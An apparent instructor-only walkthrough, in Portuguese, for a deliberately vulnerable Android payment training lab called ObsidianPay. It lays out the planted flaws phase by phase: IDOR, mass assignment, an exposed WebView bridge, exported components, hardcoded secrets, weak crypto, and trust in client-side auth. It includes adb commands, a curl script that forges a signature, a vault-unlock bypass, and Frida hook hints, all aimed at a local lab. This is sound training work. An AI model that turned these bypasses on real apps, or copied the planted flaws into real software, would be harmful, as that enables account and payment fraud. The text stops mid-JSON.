# WALKTHROUGH (Instrutor) — Lab 08: ObsidianPay Mobile

> **Documento interno do instrutor.** Não é material do aluno.
>
> **Estado: Fase 12.** Este walkthrough descreve a arquitetura, as cadeias
> futuras em alto nível, as **vulnerabilidades de backend da Fase 2**, o **app
> Android base da Fase 3**, o **armazenamento local inseguro da Fase 4**, os
> **deep links / QR / WebView da Fase 5**, a **WebView JavaScript bridge da Fase
> 6**, os **componentes Android exportados da Fase 7**, a **trilha de reverse
> engineering da Fase 8**, a **checagem de ambiente (root/emulador) da Fase 9**,
> o **Secure Vault com fluxo local de autenticação da Fase 10**, o **Network
> Security / API Host override da Fase 11** e o **App Integrity / NativeGate /
> TamperCheck scaffold da Fase 12** (visão de instrutor, sem cadeia final completa).
> Ele **não** contém:
> - a cadeia/solução final do Lab 8,
> - payloads avançados ou exploits prontos extensos.
>
> Marcadores de progresso (`FLAG{...}`) existem apenas nos dados do backend
> (`api/src/data.js`), nunca em documentos públicos nem no app.

---

## 1. Visão geral da arquitetura planejada

```
┌──────────────────────────┐        HTTP (local)        ┌───────────────────────────┐
│  App Android (futuro)    │ ─────────────────────────▶ │  ObsidianPay Mobile API     │
│  - UI carteira/pagamentos│                            │  Node.js + Express          │
│  - storage local         │ ◀───────────────────────── │  127.0.0.1:8102             │
│  - WebView support center│        JSON/token          │  estado em memória (fase 1) │
│  - deep links / QR        │                            └───────────────────────────┘
└──────────────────────────┘
```

- **Fase 1 (atual):** apenas a API. Define contratos: login, profile, config,
  receipt, support/sync. Token didático previsível (costura para vuln futura).
- **Fases seguintes:** o APK Android consome esses contratos e introduz as
  cadeias de vulnerabilidade do lado cliente, conectadas à API.

O ObsidianPay deve sempre **parecer um produto financeiro real**. Vulnerabilidades
ficam embutidas no fluxo de produto, nunca como um "menu de bugs".

---

## 2. Cadeias futuras planejadas (alto nível)

Sequência didática pretendida — sem soluções nesta fase:

1. **Recon do APK** — inventário de telas, permissões, componentes, endpoints,
   strings e configs. Base para todo o resto.
2. **Interceptação de tráfego** — observar o diálogo app↔API; identificar o que
   trafega, como e onde a confiança de transporte pode ser quebrada (local).
3. **Armazenamento local** — onde o app guarda token/dados sensíveis e o que
   vaza em SharedPreferences, SQLite, cache e arquivos temporários.
4. **Componentes exportados** — Activities/Services/Receivers/Providers
   exportados e o que pode ser acionado por outro app.
5. **Deep link + WebView** — roteamento por deep link levando a uma WebView com
   configurações inseguras e/ou bridge JS exposta.
6. **Frida / pinning / root / biometria** — instrumentação dinâmica para estudar
   pinning, detecção de root/emulador e callbacks biométricos.
7. **API authorization** — fechar a cadeia explorando autorização da API
   (acesso a objetos, mass assignment, etc.), ligando cliente e servidor.

---

## 3. Costuras já plantadas na Fase 1

Itens já presentes no backend que sustentam vulnerabilidades futuras
(intencionalmente **inofensivos** agora):

- **Token previsível/decodificável** em `/api/mobile/login` — base para forja de
  token / sessão fraca no futuro.
- **Múltiplos recibos** no modelo (`data.js`), incluindo de outro `ownerUserId`
  — preparação para estudo de autorização a nível de objeto. A Fase 1 ainda
  **valida ownership** (comportamento correto).
- **`legacySupportEndpoint` em cleartext** e **`/api/mobile/support/sync`** como
  stub legado — gancho para tráfego HTTP/legacy.
- **`mobileFeatureFlags`** (biometric, qr, webview, deep link) — sinalizam as
  superfícies que o app vai expor.

---

## 3.1 Fase 2 — vulnerabilidades de backend introduzidas

A Fase 2 ativa, **no backend**, a primeira leva de falhas. Resumo de instrutor
(sem cadeia final longa):

- **IDOR / broken object-level authorization (receipts):**
  `GET /api/mobile/receipts/:receiptId` retorna qualquer recibo existente para
  qualquer token válido. `GET /api/mobile/receipts` (lista) e
  `GET /api/mobile/receipt/:id` (singular, compat. Fase 1) **mantêm** o escopo
  correto. Recibos `1002/1003/9001` pertencem a outros papéis; `9001` é o export
  legado com `metadata.internalNote` sensível.
- **IDOR (cards):** `GET /api/mobile/cards/:cardId` devolve qualquer cartão; o
  número é mascarado, mas `ownerRole` e `internalReference` vazam. A lista
  `GET /api/mobile/cards` continua escopada.
- **Mass assignment:** `PATCH /api/mobile/profile` aceita, além de
  `displayName/phone`, os campos privilegiados `role/plan/dailyLimit/
  kycApproved/supportTier`, mutando o usuário em memória.
- **Debug gate fraco:** `GET /api/mobile/support/diagnostics` exige apenas o
  header estático `X-Obsidian-Debug: mobile-diagnostics` (além de token).
- **Legacy route disclosure:** `GET /api/mobile/legacy/routes` enumera rotas
  internas/futuras.
- **Vault role gate:** `GET /api/mobile/internal/vault-status` nega `customer`
  (403) e responde diferente para `analyst`/`operator` (base para
  biometria/root/binary patching).
- **QR/deep link (scaffold):** `POST /api/mobile/transfer/preview` com validação
  fraca (amount string/numérico, memo sem sanitização forte), sem executar
  transferência.
- **WebView (scaffold):** `GET /api/mobile/webview/support` reflete `topic`/
  `message` em HTML (semente para WebView/bridge/XSS futuro).

Credenciais `analyst`/`operator` existem em `data.js` mas **não** são
documentadas para o aluno; servem para descoberta futura via mobile/RE/storage.

### Validação rápida (instrutor)

- `bash scripts/validate-phase2.sh` cobre todos os itens acima de ponta a ponta.
- `bash scripts/validate-phase1.sh` continua passando (compatibilidade).

## 3.2 Fase 3 — app Android base

A Fase 3 entrega o cliente Android (Kotlin + Compose) em `android-app/`,
consumindo a API local via `http://10.0.2.2:8102`. Pontos de instrutor:

- **App realista:** carteira ObsidianPay com telas de Login, Início, Recibos,
  Cartões, Suporte, Prévia de transferência e Configuração — **não** é um menu
  de vulnerabilidades.
- **Comunicação HTTP local:** `usesCleartextTraffic` + `network_security_config`
  liberam cleartext só para `10.0.2.2/127.0.0.1/localhost`. Semente para o
  estudo de interceptação/tráfego legado.
- **SharedPreferences inseguro:** `InsecureSessionStore` grava token, perfil
  (cache) e identificadores em texto puro. Semente para "insecure data storage".
- **Enumeração manual por ID:** as telas de Recibos e Cartões têm um campo
  "abrir por ID" que chama `/receipts/:id` e `/cards/:id`. Na UI isso é só uma
  busca; é a superfície que conecta o aluno ao IDOR já ativo no backend (Fase 2).
  A tela **não** chama isso de IDOR.
- **Support diagnostics:** a tela de Suporte tem botões para diagnostics com e
  sem o header de debug, expondo o gate fraco da Fase 2 pela UI.
- **Transfer preview:** tela liga ao endpoint de prévia (futuro QR/deep link).
- **Componentes exportados:** apenas `MainActivity` (launcher). Exported
  components vulneráveis ficam para fase futura (comentado no Manifest).

### Validação rápida (instrutor)

- `bash scripts/validate-phase3.sh` checa estrutura Android + (opcional) backend
  com `RUN_BACKEND_TESTS=1`, e tenta build se houver Gradle/SDK.
- Sem Android SDK, o build do APK não roda; o projeto compila a configuração
  Gradle e falha apenas na detecção do SDK (esperado).

## 3.3 Fase 4 — armazenamento local inseguro (app)

A Fase 4 enriquece o storage local do app, criando as superfícies de cache que
serão exploradas futuramente. Pontos de instrutor:

- **SharedPreferences em texto puro** (`InsecureSessionStore`): token, username,
  userId, role, plan, dailyLimit, kycApproved, `rawProfileJson`, `rawConfigJson`,
  últimos support sync/diagnostics/transfer preview, últimos IDs abertos,
  timestamp e baseUrlHint.
- **SQLite local** (`ObsidianLocalDb`, `obsidianpay_local.db`): tabelas
  `cached_receipts`, `cached_cards` (com `rawJson` em claro) e `debug_events`.
- **Arquivos internos**: `cacheDir/obsidian-support-last-sync.json`,
  `filesDir/receipts/receipt-<id>.json`, `filesDir/debug/obsidian-debug-export.json`.
- **External app-specific export** (scaffold): `getExternalFilesDir(null)/obsidian-export.txt`.
  É storage específico do app, **não** storage público global (isso fica para depois).
- **Log de eventos locais** (`debug_events`): login, abertura de recibo/cartão,
  support sync, diagnostics, transfer preview, clear.
- **`LocalCacheManager`** orquestra prefs + SQLite + arquivos. A tela interna
  **Local State** mostra o estado local (apresentada como ferramenta de
  suporte/dev, não como tela de "exploração").

### Caminhos Android prováveis (alto nível)

```
/data/data/com.obsidianpay.mobile/shared_prefs/    # SharedPreferences (token, cache)
/data/data/com.obsidianpay.mobile/databases/       # obsidianpay_local.db
/data/data/com.obsidianpay.mobile/files/           # receipts/, debug/
/data/data/com.obsidianpay.mobile/cache/           # snapshot de suporte
# Android/data/com.obsidianpay.mobile/files/        # export app-specific externo
```

> Estas são as superfícies de armazenamento local. A extração/encadeamento final
> (e flags) não entram aqui nesta fase.

## 3.4 Fase 5 — deep links, QR e WebView (app)

A Fase 5 cria as superfícies de deep link, QR e WebView. Pontos de instrutor:

- **Deep links** (`AndroidManifest`): `MainActivity` aceita
  `obsidianpay://transfer`, `obsidianpay://support`, `obsidianpay://receipt`
  (VIEW + DEFAULT + BROWSABLE). Apenas `MainActivity` é exportada; nenhum
  Service/Receiver/Provider exportado nesta fase (fica para depois).
- **DeepLinkRouter** (`deeplink/`): parse permissivo (pouca sanitização, por
  design) → `DeepLinkData(type, toUserId, amount, memo, topic, message, receiptId)`.
- **Roteamento**: `MainActivity` processa o intent inicial e `onNewIntent`,
  parqueia deep link pendente se não houver login e aplica após o login.
  TRANSFER→TransferPreview, SUPPORT→WebView, RECEIPT→Receipts (auto-open).
- **QR Payment** (`QrInputScreen`): simula leitura colando/digitando o payload;
  usa o mesmo `DeepLinkRouter`.
- **WebView** (`WebViewSupportScreen`): carrega
  `http://10.0.2.2:8102/api/mobile/webview/support?topic=...&message=...`,
  com `javaScriptEnabled = true` e `domStorageEnabled = true`, **sem**
  `addJavascriptInterface` (sem bridge perigosa ainda). O backend reflete
  `topic`/`message` de forma controlada (semente de XSS/bridge para depois).
- **Cache local**: eventos `deep_link_opened`, `qr_payload_processed`,
  `webview_support_opened`, além de `transfer_preview_from_*` e `receipt_from_*`,
  e chaves `last_deep_link` / `last_qr_payload` / `last_webview_url`.

### URIs legítimas de exemplo

```
obsidianpay://transfer?toUserId=2001&amount=10&memo=test
obsidianpay://support?topic=mobile&message=hello
obsidianpay://receipt?id=1002
```

> A cadeia final (deep link → WebView → bridge / file/token disclosure) **não**
> é entregue aqui; a bridge controlada chega na Fase 6.

## 3.5 Fase 6 — WebView JavaScript bridge (app)

A Fase 6 ativa a **bridge JS controlada** na WebView de suporte, fechando a
cadeia `deep link/QR → WebView support portal → ObsidianBridge → cache local`.
Pontos de instrutor:

- **WebView inseguro** (`ui/WebViewSupportScreen.kt`): `javaScriptEnabled = true`,
  `domStorageEnabled = true` e, agora,
  `addJavascriptInterface(ObsidianSupportBridge(store, cache), "ObsidianBridge")`.
  O nome exposto ao JS é `window.ObsidianBridge`. Evento `webview_bridge_attached`.
- **Bridge** (`webview/ObsidianSupportBridge.kt`): cada método é anotado com
  `@JavascriptInterface` (executado na thread JavaBridge do WebView). Métodos:
  - `getSessionSummary()` — username, userId, role, plan, dailyLimit, últimos IDs
    abertos, `lastWebViewUrl` e **apenas um preview do token** (nunca o token
    inteiro).
  - `getCachedProfile()` / `getCachedConfig()` — `rawProfileJson` / `rawConfigJson`
    do `InsecureSessionStore`, se existirem.
  - `getLastSupportSync()` / `getLastTransferPreview()` — últimos payloads cacheados.
  - `getLocalArtifacts()` — lista de artefatos locais via `LocalCacheManager`
    (paths app-specific + tamanho).
  - `getBridgeInfo()` — `bridgeName=ObsidianBridge`, `bridgeVersion=phase6-lab`,
    `enabledMethods=[...]`.
  - `logBridgeEvent(eventType, details)` — grava em `debug_events` e retorna `ok`.
  - Eventos: `webview_bridge_called`, `bridge_get_cached_profile`,
    `bridge_get_cached_config`, `bridge_get_artifacts`, `bridge_log_event`.
- **Portal de suporte** (backend `GET /api/mobile/webview/support`): "Mobile
  Support Portal" que reflete `topic`/`message`, detecta `window.ObsidianBridge`
  ("Mobile bridge available") e oferece botões de diagnóstico assistido
  (`getBridgeInfo`, `getSessionSummary`, `getCachedConfig`). Não exfiltra nada
  automaticamente.
- **Cadeia planejada (alto nível):** um `topic`/`message` controlado (via deep
  link `obsidianpay://support?...` ou QR) chega refletido na página → JavaScript
  na WebView alcança `window.ObsidianBridge` → leitura de sessão/caches/artefatos
  locais → saída visível na página/`debug_events`. A extração final encadeada (e
  flags) fica para a fase de consolidação.

### Limites/guardas da bridge (por design)

- Não retorna `FLAG{` nem credenciais internas (`analyst123`/`operator123`).
- `getSessionSummary` traz token apenas mascarado/preview, nunca inteiro.
- Só expõe caches/artefatos que **já existem** localmente no dispositivo.
- Fora de escopo desta fase: pinning real, lib nativa, Frida/root, biometria,
  binary patching, componentes exportados vulneráveis, scanner de QR por câmera.

### Validação rápida (instrutor)

- `bash scripts/validate-phase6.sh` (estrutura). Backend anterior opcional com
  `RUN_BACKEND_TESTS=1`. Sem Android SDK, o build do APK não roda (esperado).

## 3.6 Fase 7 — Componentes Android exportados (app)

A Fase 7 adiciona o pacote `platform/` com três componentes **exportados de
propósito** e mal protegidos, integrados ao `LocalCacheManager`/SQLite/debug
events. Pontos de instrutor:

- **Activity exportada** (`platform/InternalOpsActivity.kt`): `exported=true`,
  action `com.obsidianpay.mobile.INTERNAL_OPS`, category `DEFAULT`. Lê extras
  previsíveis (`obsidian.intent.extra.INTERNAL_ROUTE/SESSION_HINT/OPERATOR_MODE/
  RECEIPT_ID`), mostra "Internal Operations", registra `exported_activity_opened`
  e, se houver `RECEIPT_ID`, grava `lastOpenedReceiptId`. Não exige login.
- **BroadcastReceiver exportado** (`platform/DebugCommandReceiver.kt`):
  `exported=true`, action `com.obsidianpay.mobile.DEBUG_COMMAND`. Extras
  `command`/`route`/`note`. Comandos controlados: `sync_marker` (evento
  `external_debug_sync_marker`), `set_last_receipt` (extra `receiptId` →
  `lastOpenedReceiptId`), `write_debug_export` (gera o export via
  `LocalCacheManager`), `enable_operator_hint` (`support/operator_hint=true`).
  Sempre registra `exported_receiver_called`. Sem comandos de sistema, sem rede.
- **ContentProvider exportado** (`platform/ObsidianNotesProvider.kt`):
  `exported=true`, authority `com.obsidianpay.mobile.provider.notes`,
  `grantUriPermissions=true`. `query()` via `MatrixCursor`:
  - `/notes` → `id,title,body` (notas de suporte genéricas, com hints didáticos);
  - `/debug` → `key,value` de `getSafeDebugValuesForProvider()` — o token aparece
    **apenas** como `token_preview` mascarado (nunca inteiro);
  - `/cache` → `item,value` com `listLocalArtifacts()`.
  - URIs desconhecidas → cursor nulo/vazio controlado.

### Exemplos de comandos (adb) — instrutor

```bash
# Activity exportada interna
adb shell am start -n com.obsidianpay.mobile/.platform.InternalOpsActivity \
  -a com.obsidianpay.mobile.INTERNAL_OPS \
  --es obsidian.intent.extra.INTERNAL_ROUTE support/ops \
  --es obsidian.intent.extra.RECEIPT_ID 1002

# BroadcastReceiver de debug
adb shell am broadcast -a com.obsidianpay.mobile.DEBUG_COMMAND \
  --es command set_last_receipt --es receiptId 1002
adb shell am broadcast -a com.obsidianpay.mobile.DEBUG_COMMAND \
  --es command write_debug_export --es route support/ops
adb shell am broadcast -a com.obsidianpay.mobile.DEBUG_COMMAND \
  --es command enable_operator_hint

# ContentProvider exportado
adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/notes
adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/debug
adb shell content query --uri content://com.obsidianpay.mobile.provider.notes/cache
```

> No build debug o `applicationId` é `com.obsidianpay.mobile.debug`; ajuste o
> alvo `-n`/pacote conforme o build instalado. Os efeitos aparecem na tela
> interna **Local State** (eventos `exported_*`/`external_debug_*`, `operatorHint`).

### Limites/guardas da Fase 7 (por design)

- Nenhum componente executa comandos de sistema ou faz rede.
- O provider só devolve `token_preview` mascarado — nunca o token inteiro.
- Sem `FLAG{` e sem credenciais internas (`analyst123`/`operator123`).
- Fora de escopo desta fase: pinning real, lib nativa, Frida/root, biometria,
  binary patching, scanner de QR por câmera.

### Validação rápida (instrutor)

- `bash scripts/validate-phase7.sh` (estrutura; reforça também os typos de bridge
  da Fase 6). Sem Android SDK, o build do APK não roda (esperado).

## 3.7 Fase 8 — Hardcoded secrets / weak crypto / reverse trail (app + backend)

A Fase 8 adiciona o pacote `security/` e o fluxo **Device Trust**, material clássico
de reverse engineering mobile (JADX/apktool/`strings`). Pontos de instrutor:

- **HardcodedSecrets** (`security/HardcodedSecrets.kt`): segredos **fragmentados**
  reassemblados em runtime — escondem dos `strings` ingênuos, mas são triviais no
  JADX:
  - client id = `INTERNAL_CLIENT_PART_A+B+C` → `obsidian-mobile-legacy-client`;
  - salt = `LEGACY_SIGNING_SALT_PART_1+2` → `obsidian-legacy-attestation-2026`;
  - `getEncodedOperatorHint()` → Base64 de `operator-hint:mobile-support`;
  - `getHiddenRoutes()` → `/device-trust`, `/legacy-attestation`, `/reverse-hint`.
- **WeakCrypto** (`security/WeakCrypto.kt`): Base64 (codificação, não cripto),
  XOR de chave repetida (reversível) e SHA-1/MD5 (quebrados). Base64 é usado como
  **falsa proteção** do hint.
- **LegacyRequestSigner** (`security/LegacyRequestSigner.kt`): assinatura =
  `sha1(username:deviceId:timestamp:salt)` — **sem HMAC, sem nonce**. Quem
  recupera o salt forja a assinatura offline. `buildHeaders()` monta
  `X-Obsidian-Client/Device/Timestamp/Signature`.
- **DeviceTrustScreen** (`ui/DeviceTrustScreen.kt`): monta a assinatura, decodifica
  o hint Base64 e chama o endpoint interno; cacheia
  `lastDeviceTrustJson`/`lastLegacySignature`/`lastEncodedOperatorHint` e registra
  os eventos `device_trust_*` / `weak_signature_generated` / `encoded_hint_decoded`.
- **Backend** (`api/src/server.js` + `data.js`):
  - `POST /api/mobile/internal/device-trust` exige token válido + os 4 headers, e
    **recomputa a mesma assinatura SHA-1 fraca** (salt hardcoded em
    `legacyMobileTrust`). Assinatura ok → `{status:"trusted-legacy",
    mode:"legacy-attestation", ...}`; errada → 403.
  - `GET /api/mobile/internal/reverse-hint` exige o client id correto e devolve
    "Legacy mobile clients assemble trust headers locally."
  - `config`/`legacy/routes` referenciam `enableLegacyDeviceTrust`,
    `internalDeviceTrustPath`, `internalReverseHintPath` (sem expor salt/client id).

### Como será encontrado (reverse engineering)

1. JADX no APK → ler `security/HardcodedSecrets.kt` e reassemblar client id + salt.
2. Reconhecer Base64 do hint e decodá-lo (`WeakCrypto.base64Decode`).
3. Reproduzir `sha1(username:deviceId:timestamp:salt)` offline e forjar headers.
4. Chamar `/api/mobile/internal/device-trust` (e `/reverse-hint`) fora do app.

### Exemplo (instrutor) — forjar a assinatura via shell

```bash
SALT='obsidian-legacy-attestation-2026'
SIG=$(printf '%s' "guest:android-emulator-obsidian:1700000000000:$SALT" | sha1sum | cut -d' ' -f1)
curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/device-trust \
  -H "Authorization: Bearer obsidian-mobile-token-guest-1001" \
  -H "X-Obsidian-Client: obsidian-mobile-legacy-client" \
  -H "X-Obsidian-Device: android-emulator-obsidian" \
  -H "X-Obsidian-Timestamp: 1700000000000" \
  -H "X-Obsidian-Signature: $SIG" \
  -H 'Content-Type: application/json' \
  -d '{"deviceId":"android-emulator-obsidian","attestationMode":"legacy","operatorHint":"x"}'
```

### Limites/guardas da Fase 8 (por design)

- Nenhum segredo real; salt/client id são didáticos e existem para serem recuperados.
- Sem `FLAG{` nas classes `security/`, na `DeviceTrustScreen` nem nos novos endpoints.
- Sem `analyst123`/`operator123` nessas classes.
- Fora de escopo: pinning real, lib nativa/JNI, Frida, root real, biometria,
  binary patching, scanner de QR por câmera.

### Validação rápida (instrutor)

- `bash scripts/validate-phase8.sh` (estrutura; reforça também os typos de bridge).
  Sem Android SDK, o build do APK não roda (esperado).

## 4. Matriz de vulnerabilidades planejadas

Detalhe completo por trilha em [docs/VULNERABILITY-ROADMAP.md](./docs/VULNERABILITY-ROADMAP.md).
Resumo de status (atualizado na Fase 2):

| # | Trilha | Vulnerabilidade planejada | Status |
|---|---|---|---|
| 1 | Network/API | HTTP legacy sync | implemented-backend |
| 2 | Network/API | HTTPS interception | planned |
| 3 | Network/API | Certificate pinning bypass | planned |
| 4 | Network/API | Native pinning | planned |
| 5 | Storage/RE | SharedPreferences token leak | implemented-app |
| 6 | Storage/RE | SQLite sensitive data | implemented-app |
| 7 | Storage/RE | Temp/cache file leak | implemented-app |
| 8 | Storage/RE | Hardcoded/config secrets | implemented-app |
| 9 | Storage/RE | Weak crypto | implemented-app |
| 10 | Platform | Exported Activity | implemented-app |
| 11 | Platform | Exported Service | planned |
| 12 | Platform | BroadcastReceiver debug trigger | implemented-app |
| 13 | Platform | ContentProvider exposure | implemented-app |
| 14 | Platform | Deep link abuse | implemented-app |
| 15 | Platform | QR Code untrusted input | implemented-app |
| 16 | WebView | Unsafe WebView settings | implemented-app |
| 17 | WebView | JavaScript bridge exposure | implemented-app |
| 18 | WebView | Deep link → WebView chain | implemented-app |
| 19 | WebView | Local file / token disclosure | scaffolded-app |
| 20 | Anti-analysis/Auth | Root detection bypass | scaffolded-app |
| 21 | Anti-analysis/Auth | Emulator detection bypass | scaffolded-app |
| 21b | Anti-analysis/Auth | Client-side environment trust | implemented-app/backend |
| 21c | Anti-analysis/Auth | Frida bypass (environment detectors) | planned |
| 21d | Anti-analysis/Auth | Binary patching (risk engine) | planned |
| 22 | Anti-analysis/Auth | Biometric vault backend gate | scaffolded |
| 23 | Anti-analysis/Auth | Binary patching (geral) | planned |
| 24 | Anti-analysis/Auth | API broken access control | implemented-backend |
| 25 | Anti-analysis/Auth | Mass assignment | implemented-backend |

---

## 6. Fase 9 — visão do instrutor: checagem de ambiente

### O que foi implementado

O pacote `environment/` introduz três componentes didáticos:

**`RootDetector.kt`** — verifica indicadores de root:
- Paths de `su` (`/system/bin/su`, `/system/xbin/su`, `/sbin/su`, `/su/bin/su`,
  `/system/app/Superuser.apk`, `/system/bin/.ext/.su`)
- Pacotes de root managers via `PackageManager` (`com.topjohnwu.magisk`,
  `eu.chainfire.supersu`, `com.koushikdutta.superuser`)
- Build tag `test-keys`
- Props `ro.debuggable=1` e `ro.secure=0` (reflexão sobre `SystemProperties`)

**`EmulatorDetector.kt`** — verifica campos de `Build.*`:
- `FINGERPRINT` contém `generic`/`unknown`
- `MODEL` contém `google_sdk`/`emulator`/`android sdk built for x86`
- `MANUFACTURER` contém `Genymotion`
- `BRAND`/`DEVICE` contém `generic`
- `PRODUCT` contém `sdk`/`google_sdk`/`emulator`/`vbox86p`
- `HARDWARE` contém `goldfish`/`ranchu`/`vbox86`

**`EnvironmentRiskEngine.kt`** — combina os dois detectores:
- `riskLevel` = `low` / `medium` / `high`
- `bypassHintId` aponta a estratégia de bypass (sem entregar o script Frida)
- Resultado serializado em JSON para local storage e backend

### Por que é bypassável por design

1. **Todos os checks rodam no processo do app** (`env-check-local-only`) — não há
   verificação server-side independente. Um atacante pode ignorar completamente
   esses checks via proxy (não enviando o report), via injeção de bytecode antes
   do check, ou usando Frida para interceptar na camada Dalvik.

2. **Frida pode hookar qualquer método Kotlin** (`hooks-change-return-values`):
   ```javascript
   // Exemplo conceitual (NÃO um script pronto)
   // Hookar RootDetector.check() para retornar isRooted=false
   // Hookar EmulatorDetector.check() para retornar isEmulator=false
   // Hookar EnvironmentRiskEngine.run() para retornar riskLevel="low"
   ```

3. **Binary patching** (`patch-risk-engine-result`): com apktool + smali, a
   constante retornada em `EnvironmentRiskEngine.toJson()` pode ser hardcodada
   como `"riskLevel":"low"` independente dos checks.

4. **O backend é monitor-only**: mesmo que os sinais cheguem, o servidor não
   bloqueia o app (`serverPolicy: "monitor-only"`). A decisão de confiar no
   cliente é sempre a raiz do problema.

### O que o aluno encontra no armazenamento local

Após rodar o Security Check:
- `SharedPreferences`: `obsidian.debug.last_environment_report` (JSON do report)
  e `obsidian.debug.last_environment_response` (resposta do servidor)
- `SQLite debug_events`: eventos `environment_check_started`,
  `root_detection_completed`, `emulator_detection_completed`,
  `environment_risk_calculated`, `environment_report_sent`,
  `environment_report_cached`
- `LocalStateScreen` mostra as previews desses valores

### O que NÃO está nesta fase (Fase 9)

- Frida scripts reais (deixado para fase futura)
- Certificate pinning real
- Native lib / JNI
- Biometria (adicionada na Fase 10)
- Binary patching real
- QR scanner por câmera real

---

## 4.10 Fase 10 — Secure Vault / Local Auth (instrutor)

### Arquitetura do fluxo

```
VaultScreen
  │
  ├─ BiometricGate.canUseBiometric(context)   → scaffold: sempre true
  ├─ BiometricGate.buildBypassHintId()        → "biometric-result-hook"
  │
  ├─ LocalAuthState.validateFallbackPin(input) → compara com PIN hardcoded "0420"
  ├─ LocalAuthState.markVaultUnlocked(store, reason)
  │       └─▶ SharedPreferences: obsidian.vault.unlocked = true
  │                               obsidian.vault.unlock_reason = "biometric"|"fallback-pin"
  │
  ├─ ApiClient.getMobileVaultStatus(token)
  │       └─▶ GET /api/mobile/internal/vault-mobile/status
  │           response: { status: "locked", policy: "local-auth-required",
  │                        serverTrust: "client-asserted" }
  │
  └─ ApiClient.requestMobileVaultUnlock(token, localAuth, method, bypassHintId)
          └─▶ POST /api/mobile/internal/vault-mobile/unlock
              body: { localAuth: true/false, method: "biometric", bypassHintId: "..." }
              if localAuth === true → { status: "vault-access-granted",
                                        nextStepHint: "server trusts local auth assertion in this lab" }
              if localAuth !== true → 403
```

### Vulnerabilidades didáticas plantadas

1. **Fallback PIN fraco hardcoded** (`LocalAuthState.WEAK_FALLBACK_PIN = "0420"`):
   O PIN é uma constante no APK — recuperável por análise estática (JADX/`strings`).

2. **Estado de auth local não protegido** (`InsecureSessionStore`):
   `obsidian.vault.unlocked` e `obsidian.vault.unlock_reason` estão em
   SharedPreferences em texto puro. Um atacante com acesso ao dispositivo (root)
   pode editá-los diretamente e "convencer" o app de que o vault já está aberto.

3. **Biometric scaffold trivialmente substituível** (`BiometricGate`):
   `canUseBiometric()` retorna `true` e o resultado do scaffold é hardcoded. Um
   hook Frida em `BiometricGate.canUseBiometric` ou na variável `scaffoldResult`
   da VaultScreen é suficiente para forçar qualquer resultado.

4. **Server trusts client-side localAuth assertion** (backend):
   O `POST /api/mobile/internal/vault-mobile/unlock` só verifica se `localAuth === true`
   no body. Qualquer cliente pode enviar `{"localAuth": true}` sem ter passado
   por autenticação real — o servidor não tem como saber. Bypass trivial via curl:
   ```bash
   curl -s -X POST http://127.0.0.1:8102/api/mobile/internal/vault-mobile/unlock \
     -H "Authorization: Bearer obsidian-mobile-token-guest-1001" \
     -H "Content-Type: application/json" \
     -d '{"localAuth":true,"method":"bypass","bypassHintId":"force-auth-decision-true"}'
   ```

### Bypass hints para futura exploração

| Hint | Técnica |
|---|---|
| `biometric-result-hook` | Frida: hookar `BiometricGate.canUseBiometric` ou `scaffoldResult` |
| `force-auth-decision-true` | Frida: hookar `LocalAuthState.validateFallbackPin` para retornar `true` |
| `patch-local-auth-state` | Smali/apktool: patchear `LocalAuthState.isVaultUnlocked` |

### Eventos registrados

`biometric_capability_checked`, `biometric_prompt_started`, `biometric_auth_result`,
`local_auth_success`, `local_auth_failed`, `vault_unlocked_local`, `vault_locked_local`,
`weak_pin_fallback_used`, `vault_status_cached`, `vault_unlock_response_cached`

### O que NÃO está nesta fase (Fase 10)

- Frida scripts reais
- Certificate pinning real
- Native lib / JNI
- Binary patching real
- QR scanner por câmera real

---

---

## 5. Fase 11 — Network Security / Certificate Pinning Scaffold (INSTRUTOR)

### Objetivo desta fase

Introduzir a superfície de análise de tráfego de rede de forma controlada:
- Permitir que o app funcione em emulador **e** celular físico sem rebuild.
- Plantar o scaffold de certificate pinning como âncora para futuro estudo via
  Frida/proxy, sem ainda forçar pinning real.
- Expor um endpoint interno `/api/mobile/internal/network-profile` que mostra
  o perfil de rede do lab e os hint IDs de bypass.

### Arquivos novos

| Arquivo | Descrição |
|---|---|
| `network/NetworkSecurityProfile.kt` | Constantes de URL (emulador/localhost/LAN), perfis de rede, helpers de normalização e hint IDs didáticos. |
| `network/PinningPolicy.kt` | Scaffold de certificate pinning: modos, SHA-256 placeholder, `shouldAttachCertificatePinner` (false para HTTP). |
| `ui/ApiHostOverrideScreen.kt` | Tela "API Host" para override de base URL em runtime; fetch do network-profile. |

### Diferença emulador vs. celular físico

| Ambiente | URL padrão | Como funciona |
|---|---|---|
| Android Emulator | `http://10.0.2.2:8102` | `10.0.2.2` é o alias do emulador para `127.0.0.1` do host. Funciona sem configuração extra. |
| Celular físico | `http://<IP_DO_PC>:8102` | O celular precisa alcançar o PC na LAN. O IP do PC deve ser digitado na tela API Host. |

**Por que não funciona `127.0.0.1` no celular físico?**
`127.0.0.1` no celular físico é o loopback do **próprio dispositivo**, não do PC.
O lab resolve isso via override de base URL.

### Como usar Burp Suite com o app (cenário futuro)

Quando o lab evoluir para HTTPS real:
1. Instalar certificado Burp no dispositivo.
2. Android 7+: user-installed CAs não são confiáveis por padrão para apps com
   `targetSdkVersion >= 24`. Soluções didáticas: Frida hook no TrustManager,
   `network-security-config` com `<certificates src="user"/>`, ou objection.
3. O hint `user-ca-not-trusted-by-default` aponta exatamente para esse bloqueio.

### Certificate pinning scaffold — onde hookar futuramente

O `ApiClient` tem um comentário indicando onde o `CertificatePinner` seria
anexado:
```kotlin
// .certificatePinner(buildPinner())  // Phase 11 scaffold — enable for HTTPS
```
O `PinningPolicy.shouldAttachCertificatePinner` retorna `false` para HTTP.
Para HTTPS em `strict-scaffold`: retornaria `true` → pinner seria construído com
`PinningPolicy.getSamplePins()` (placeholder SHA-256).

Bypass hints para quando pinning for ativado:
- `okhttp-certificate-pinner-hook` → Frida: hookar `CertificatePinner.check()`
- `trust-manager-hook` → Frida: hookar `X509TrustManager.checkServerTrusted()`
- `trust-user-ca` → usar CA de usuário + `network-security-config` adequado
- `report-only` → modo de log sem bloqueio (didático)

### Endpoint backend `/api/mobile/internal/network-profile`

Requer Bearer válido. Resposta:
```json
{
  "status": "ok",
  "profile": "burp-proxy-ready",
  "pinningMode": "report-only",
  "cleartextAllowed": true,
  "defaultEmulatorBaseUrl": "http://10.0.2.2:8102",
  "phoneLanExample": "http://192.168.0.50:8102",
  "bypassHintIds": ["trust-user-ca", "okhttp-certificate-pinner-hook", "network-config-cleartext-override"],
